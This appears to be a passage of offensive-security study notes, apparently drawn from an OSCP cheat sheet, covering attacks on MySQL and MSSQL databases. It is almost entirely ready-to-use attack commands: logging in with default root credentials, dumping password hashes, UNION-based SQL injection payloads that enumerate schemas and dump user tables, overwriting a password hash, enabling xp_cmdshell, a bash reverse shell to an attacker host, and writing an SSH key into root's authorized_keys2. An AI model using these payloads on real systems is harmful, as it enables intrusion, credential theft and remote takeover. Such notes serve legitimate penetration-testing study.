se		clear with Ctrl + L
Connect, with root:root creds over default port 3306
```c
mysql -u root -p'root' -h 192.168.50.16 -P3306
```

Get Version info:
```c
select version();
```

Verify current database user for ongoing session:
```c
select system_user();
```
			Verifys who you are

Show all MySql databases
```c
show databases;
```

Retried password of the offsec user present in the mysql database:
```c
SELECT user, authentication_string FROM mysql.user WHERE user ='offsec';
```
			will provide hash of password

To see all tables under a database:
```c
use <databasename>;
```
```c
show tables;
```




Attempt our first attack by enumerating the current database name, user, and MySQL version:
```c
%' UNION SELECT database(), user(), @@version, null, null -- //
```
BETTER ALTERNATE, apps dont typically show first column since its typically just an ID, so push everything to the right and null left:
```c
' UNION SELECT null, null, database(), user(), @@version  -- //
```

Lets enumerate for other tables in the database:
```c
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Now use the output shown from previous step to dump usernames and md5 hashes of user table:
```c
' UNION SELECT null, username, password, description, null FROM users -- //
```

#### MySQL

```c
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
```

```c
mysql> show databases;
mysql> use <DATABASE>;
mysql> show tables;
mysql> describe <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
```

##### [](https://github.com/0xsyr0/OSCP#update-user-password)Update User Password

```c
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

##### [](https://github.com/0xsyr0/OSCP#drop-a-shell)Drop a Shell

```c
mysql> \! /bin/sh
```

##### [](https://github.com/0xsyr0/OSCP#xp_cmdshell)xp_cmdshell

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

##### [](https://github.com/0xsyr0/OSCP#insert-code-to-get-executed)Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

##### [](https://github.com/0xsyr0/OSCP#write-ssh-key-into-authorized_keys2-file)Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

##### [](https://github.com/0xsyr0/OSCP#linked-sql-server-enumeration)Linked SQL Server Enumeration

```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') a
```